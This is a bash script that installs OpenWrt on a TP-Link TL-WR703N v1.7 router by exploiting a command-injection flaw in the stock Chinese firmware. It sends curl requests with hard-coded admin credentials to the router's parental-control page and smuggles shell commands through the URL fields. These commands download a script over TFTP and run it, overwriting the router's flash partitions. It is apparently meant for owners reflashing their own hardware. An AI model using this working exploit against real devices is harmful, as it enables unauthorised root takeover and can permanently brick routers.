#!/bin/bash

# Global URLs
TPLINK_FIRMWARE_URL="http://downloads.openwrt.org/barrier_breaker/14.07/ar71xx/generic/openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin"
BUSYBOX_URL="http://www.busybox.net/downloads/binaries/1.16.1/busybox-mips"

# Autodetect IP
HOST_IP_AUTO=`ifconfig | grep eth0 -A 1 | grep -o "inet addr[^ ]*" | cut -d: -f 2`

# Colors
red='\033[0;31m'
green='\033[0;32m'
nc='\033[0m' # No Color

echo "========================================================"
echo "=== Flash TPLink 703n v1.7 Chineese firmware via tftp =="
echo "========================================================"
echo ""
read -r -p "Root dir of your TFTP server to use [/tftpboot]: " TFTP_DIR_IN
TFTP_DIR=${TFTP_DIR_IN:-/tftpboot}
read -r -p "Host IP [$HOST_IP_AUTO]: " HOST_IP_IN
HOST_IP=${HOST_IP_IN:-$HOST_IP_AUTO}


echo ""
echo -e "${green}[+] Changing current working directory to $TFTP_DIR...$nc"

cd $TFTP_DIR


echo ""
echo -e "${green}[+] Downloading tplink firmware...$nc"

wget $TPLINK_FIRMWARE_URL


echo ""
echo -e "${green}[+] Downloading busybox...$nc"

wget $BUSYBOX_URL
mv busybox-mips busybox


echo ""
echo -e "${green}[+] Splitting firmware...$nc"

dd if=openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of=i1 bs=1 count=1048576
dd if=openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of=i2 bs=1 skip=1048576


echo ""
echo -e "${green}[+] Creating TPLink's flashing script...$nc"

cat <<EOF > aa
cd /tmp
tftp -gl i1 $HOST_IP
tftp -gl i2 $HOST_IP
tftp -gl busybox $HOST_IP
chmod 755 busybox
./busybox dd if=i1 of=/dev/mtdblock1 conv=fsync
./busybox dd if=i2 of=/dev/mtdblock2 conv=fsync
./busybox reboot -f
EOF


echo ""
echo -e "${green}[+] Flashing TPLink firmware...$nc"
echo -e "${green}[+] Step 1/3$nc"
curl -o - -b "tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=true" "http://192.168.1.1/"

echo ""
echo -e "${green}[+] Step 2/3$nc"
curl -o - -b "tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=" --referer "http://192.168.1.1/userRpm/ParentCtrlRpm.htm" "http://192.168.1.1/userRpm/ParentCtrlRpm.htm?ctrl_enable=1&parent_mac_addr=00-00-00-00-00-02&Page=1"

echo ""
echo -e "${green}[+] Step 3/3$nc"
echo -e "${red}[!] DO NOT POWER OFF YOUR ROUTER, IT WILL BRICK (and you need 3.3V serial to revive it)."
echo -e "[!] Wait for Power LED to stop blinking...$nc"

curl -o - -b "tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=" --referer "http://192.168.1.1/userRpm/ParentCtrlRpm.htm?Modify=0&Page=1" "http://192.168.1.1/userRpm/ParentCtrlRpm.htm?child_mac=00-00-00-00-00-01&lan_lists=888&url_comment=test&url_0=;cd%20/tmp;&url_1=;tftp%20-gl%20aa%20$HOST_IP;&url_2=;sh%20aa;&url_3=&url_4=&url_5=&url_6=&url_7=&scheds_lists=255&enable=1&Changed=1&SelIndex=0&Page=1&rule_mode=0&Save=%B1%A3+%B4%E6"

echo ""
echo "[+] DONE."

